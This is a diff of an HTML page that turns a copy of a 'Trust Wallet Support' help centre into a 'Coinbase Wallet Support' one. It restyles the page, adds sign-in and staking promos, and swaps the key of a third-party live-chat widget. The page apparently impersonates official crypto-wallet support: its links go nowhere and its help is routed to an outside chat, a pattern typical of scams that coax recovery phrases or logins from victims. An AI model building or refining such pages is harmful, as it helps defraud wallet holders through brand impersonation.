@@ -2,276 +2,258 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Trust Wallet Support</title>
+  <title>Coinbase Wallet Support</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: 'Segoe UI', Roboto, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      color: #1c1f25;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #e9f0ff, #f4f7fb);
+      color: #333;
+      padding-bottom: 50px;
     }
 
-    header {
-      padding: 30px 20px 20px;
+    a { color: #0052ff; text-decoration: none; cursor: pointer; }
+
+    header, footer {
+      background: #ffffff;
+      padding: 15px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
     }
 
-    .logo {
-      width: 50px;
-      height: auto;
-    }
+    .logo { font-weight: bold; font-size: 1.7em; color: #0052ff; }
+    .header-controls { display: flex; gap: 15px; align-items: center; }
 
-    h1 {
-      font-size: 30px;
-      font-weight: 700;
-      margin: 20px 0 10px;
-      text-align: center;
+    .btn-blue {
+      background: #0052ff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
     }
+    .btn-blue:hover { background: #003ecc; }
+
+    .main { padding: 30px; }
 
     .search-bar {
-      margin: 0 auto 25px;
-      max-width: 380px;
-      padding: 14px 20px;
-      background: #f2f4f7;
-      border-radius: 25px;
-      font-size: 16px;
-      font-weight: 500;
-      color: #555;
-      text-align: center;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 30px;
+      background: white;
+      padding: 12px 15px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
     }
 
+    .search-bar input {
+      flex: 1;
+      border: none;
+      font-size: 1em;
+      outline: none;
+    }
+
+    .quick-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+
+    .quick-link {
+      padding: 12px 18px;
+      background: #e6f0ff;
+      border-radius: 8px;
+      font-weight: bold;
+      color: #0052ff;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: background 0.2s ease;
+    }
+
+    .quick-link:hover { background: #d0e4ff; }
+
     .section-title {
-      font-size: 24px;
-      font-weight: 700;
-      padding: 0 20px;
-      margin-top: 35px;
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      font-weight: bold;
     }
 
     .card {
-      background: #fff;
-      border-radius: 16px;
-      margin: 18px 20px;
-      padding: 28px 20px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.06);
+      transition: transform 0.2s ease;
+    }
+
+    .card:hover { transform: translateY(-2px); }
+
+    .radio-group {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .radio-card {
       display: flex;
       flex-direction: column;
       align-items: center;
-      text-align: center;
-    }
-
-    .card img.large {
-      width: 180px;
-      height: auto;
-      margin-bottom: 18px;
-    }
-
-    .card img.medium {
-      width: 65px;
-      height: auto;
-      margin-bottom: 18px;
-    }
-
-    .card p {
-      font-size: 18px;
-      font-weight: 600;
-      margin: 0;
-      line-height: 1.4;
-    }
-
-    .support-card p {
-      font-weight: 400;
-      color: #444;
-    }
-
-    .button-group {
-      text-align: center;
-      margin: 30px 0;
-    }
-
-    .button-group button {
-      background: #0040ff;
-      color: white;
-      font-weight: 600;
-      font-size: 18px;
-      border: none;
-      border-radius: 25px;
-      padding: 15px 32px;
-      margin: 10px;
-      cursor: pointer;
-    }
-
-    .cta-section {
-      background: #0040ff;
-      color: white;
-      text-align: center;
-      padding: 35px 25px;
-      border-radius: 20px;
-      margin: 30px 20px;
-    }
-
-    .cta-section h2 {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 15px;
-    }
-
-    .cta-section button {
+      padding: 20px;
       background: white;
-      color: #0040ff;
-      border-radius: 25px;
-      border: none;
-      padding: 13px 28px;
-      font-weight: 700;
-      font-size: 16px;
-      cursor: pointer;
+      border-radius: 8px;
+      width: 30%;
+      min-width: 250px;
+      text-align: center;
+      text-decoration: none;
+      color: inherit;
+      transition: box-shadow 0.3s ease;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .radio-card:hover {
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      transform: translateY(-2px);
+    }
+
+    .radio-card i {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      color: #0052ff;
+    }
+
+    .newsletter {
+      margin: 40px 0;
+      padding: 30px;
+      background: #eef5ff;
+      border-radius: 8px;
+    }
+
+    .newsletter input[type="email"] {
+      padding: 10px;
+      width: 250px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-right: 10px;
+    }
+
+    .status-indicator {
+      display: inline-block;
+      background: #d4edda;
+      color: green;
+      padding: 6px 12px;
+      border-radius: 4px;
+      font-weight: 600;
     }
 
     footer {
+      padding: 40px 30px;
+      background: white;
+      border-top: 1px solid #ddd;
       text-align: center;
-      padding: 35px 20px;
-      font-size: 15px;
-      color: #555;
     }
 
-    footer a {
-      color: #0052ff;
-      text-decoration: none;
-      display: block;
-      margin: 6px 0;
-      font-weight: 500;
-    }
-
-    .support-section-title {
-      font-size: 50px;
-      font-family: Georgia, serif;
-      color: #433;
-      font-weight: 400;
-      padding: 0 20px;
-      margin-top: 40px;
+    @media (max-width: 768px) {
+      .radio-card { width: 100%; }
     }
   </style>
 </head>
 <body>
 
 <header>
-  <div style="display: flex; justify-content: space-between; align-items: flex-start;">
-    <img src="trustwallett.jpg" class="logo" alt="Support Logo" style="align-self: flex-start;" />
+  <div class="logo"><a href="#">Coinbase</a></div>
+  <div class="header-controls">
+    <button class="btn-blue">Sign in</button>
+    <span><i class="fas fa-globe"></i> US</span>
+    <span><i class="fas fa-bars"></i></span>
   </div>
-  <h1>How can we help you</h1>
-  <div class="search-bar">🔍 Check our FAQ:</div>
 </header>
 
-<div class="section-title">Trending topics</div>
+<main class="main">
 
-<div class="card">
-  <img src="trustwallet1.jpg" class="large" alt="Transfer Funds">
-  <p>How to transfer funds to my bank account</p>
-</div>
+  <div class="search-bar">
+    <i class="fas fa-search"></i>
+    <input type="text" placeholder="Search for help or topics..." />
+  </div>
 
-<div class="card">
-  <img src="trustwallet2.jpg" class="large" alt="Report Scam">
-  <p>Report Scam & Fraud</p>
-</div>
+  <div class="quick-links">
+    <a href="#" class="quick-link"><i class="fas fa-lock"></i> Password Reset</a>
+    <a href="#" class="quick-link"><i class="fas fa-user-lock"></i> Account Recovery</a>
+    <a href="#" class="quick-link"><i class="fas fa-shield-alt"></i> Security Tips</a>
+    <a href="#" class="quick-link"><i class="fas fa-bug"></i> Report an Issue</a>
+  </div>
 
-<div class="card">
-  <img src="trustwallet3.jpg" class="large" alt="Wrong Network">
-  <p>Send funds to the wrong network</p>
-</div>
+  <div class="section-title">We’re here to help</div>
 
-<div class="card">
-  <img src="trustwallet4.jpg" class="large" alt="Lost Recovery Key">
-  <p>Lost Recovery Phrase or Private Key</p>
-</div>
+  <div class="card">
+    <h2>Sign in for personalized support</h2>
+    <p>Access your support history, live chat with agents, and get tailored guidance by signing in.</p>
+    <button class="btn-blue">Sign in for support</button>
+    <p style="margin-top: 10px;">Unable to sign in? <strong>Click here</strong></p>
+  </div>
 
-<div class="card">
-  <img src="trustwallet5.jpg" class="large" alt="Sell Fails">
-  <p>What to do if Selling Crypto in-app Fails</p>
-</div>
+  <!-- Image 1: Wallet Interface -->
+  <div class="card">
+    <img src="coinbase1.jpg" alt="Coinbase Wallet Interface" style="width:100%; border-radius:10px; margin-bottom:10px;" />
+    <p>View your balance, send/receive funds, access Coinbase Wallet, and more.</p>
+  </div>
 
-<div class="card">
-  <img src="trustwallet6.jpg" class="large" alt="Locate Funds">
-  <p>How to Locate Missing Funds</p>
-</div>
+  <!-- Image 2: Staking Promo -->
+  <div class="card">
+    <img src="coinbase2.jpg" alt="Earn APY with Coinbase Staking" style="width:100%; border-radius:10px; margin-bottom:10px;" />
+    <h3>Earn up to 14% APY</h3>
+    <p>Stake your crypto and earn rewards. Explore staking options with Coinbase.</p>
+    <a href="#" class="btn-blue">Explore staking options</a>
+  </div>
 
-<div class="card">
-  <img src="trustwallet7.jpg">
-  <p>What happened with my last transaction?</p>
-  <img src="trustwallet8.jpg" alt="Tokens" style="width: 190px; margin: 15px 0;">
-  <button style="
-    background: #0040ff;
-    color: #fff;
-    padding: 16px 40px;
-    font-size: 18px;
-    font-weight: 800;
-    border-radius: 30px;
-    border: none;
-    cursor: pointer;
-    margin-top: 10px;
-  ">Try the beta</button>
-</div>
+  <!-- Image 3: Withdrawal Sample -->
+  <div class="card">
+    <img src="coinbase3.jpg" alt="Withdraw Funds Example" style="width:100%; border-radius:10px; margin-bottom:10px;" />
+    <p>Instant GBP withdrawals with zero Coinbase fees.</p>
+  </div>
 
-<!-- START: Support Section -->
-<div class="support-section-title">Support topics</div>
+  <!-- Image 4: Trading Interface -->
+  <div class="card">
+    <img src="coinbase4.jpg" alt="Coinbase Advanced Trade View" style="width:100%; border-radius:10px; margin-bottom:10px;" />
+    <h3>Advanced Trade</h3>
+    <p>Monitor real-time charts, set limit orders, and trade securely on Coinbase Pro tools.</p>
+  </div>
 
-<div class="card support-card">
-  <img src="trustwallet11.jpg" class="medium" alt="Getting Started">
-  <p>Getting Started with Trust Wallet</p>
-</div>
+  <div class="section-title">More Coinbase Resources</div>
+  <div class="radio-group">
+    <a href="#" class="radio-card"><i class="fas fa-wallet"></i><strong>Wallet</strong></a>
+    <a href="#" class="radio-card"><i class="fas fa-credit-card"></i><strong>Card</strong></a>
+    <a href="#" class="radio-card"><i class="fas fa-image"></i><strong>NFT</strong></a>
+    <a href="#" class="radio-card"><i class="fas fa-chart-line"></i><strong>Prime</strong></a>
+  </div>
 
-<div class="card support-card">
-  <img src="trustwallet12.jpg" class="medium" alt="Cash Out">
-  <p>Buying and Cashing Out Crypto</p>
-</div>
+  <div class="newsletter">
+    <h3><i class="fas fa-envelope-open-text"></i> Stay updated</h3>
+    <p>Receive security alerts, new features, and market insights.</p>
+    <input type="email" placeholder="you@example.com" />
+    <button class="btn-blue">Subscribe</button>
+  </div>
 
-<div class="card support-card">
-  <img src="trustwallet13.jpg" class="medium" alt="Rewards">
-  <p>Generating Rewards</p>
-</div>
+  <p><strong>System Status:</strong> <span class="status-indicator">✔ All systems operational</span></p>
 
-<div class="card support-card">
-  <img src="trustwallet14.jpg" class="medium" alt="DeFi">
-  <p>Connecting to DeFi and dApps</p>
-</div>
-
-<div class="card support-card">
-  <img src="trustwallet15.jpg" class="medium" alt="Security">
-  <p>Security</p>
-</div>
-
-<div class="card support-card">
-  <img src="trustwallet16.jpg" class="medium" alt="How-to Guides">
-  <p>How-to Guides</p>
-</div>
-<!-- END: Support Section -->
-
-<div class="section-title">Contact us for:</div>
-
-<div class="button-group">
-  <button>Bug Bounty</button>
-  <button>List a token</button>
-  <button>Launchpool listing</button>
-</div>
-
-<div class="cta-section">
-  <h2>Now what you are looking for?</h2>
-  <button>Ask our Chatbot</button>
-</div>
+</main>
 
 <footer>
-  <div style="font-weight: 600;">Help Center</div>
-  <div style="margin-top: 5px;">Brought to you by <a href="#">Trust Wallet</a></div>
-  <br />
-  <a href="#">FAQ</a>
-  <a href="#">Assets</a>
-  <a href="#">Terms of Service</a>
-  <a href="#">Privacy Policy</a>
-  <a href="#">Submit DApp</a>
+  <p>© 2025 Coinbase Support. All rights reserved.</p>
 </footer>
 <!-- Smartsupp Live Chat script -->
 <script type="text/javascript">
 var _smartsupp = _smartsupp || {};
-_smartsupp.key = 'dbe5d33b9adf460ddae09c9a45627cf1106bf7f1';
+_smartsupp.key = '8bdedb242875d71b66943a4af84826c705e7f1d6';
 window.smartsupp||(function(d) {
   var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
   s=d.getElementsByTagName('script')[0];c=d.createElement('script');
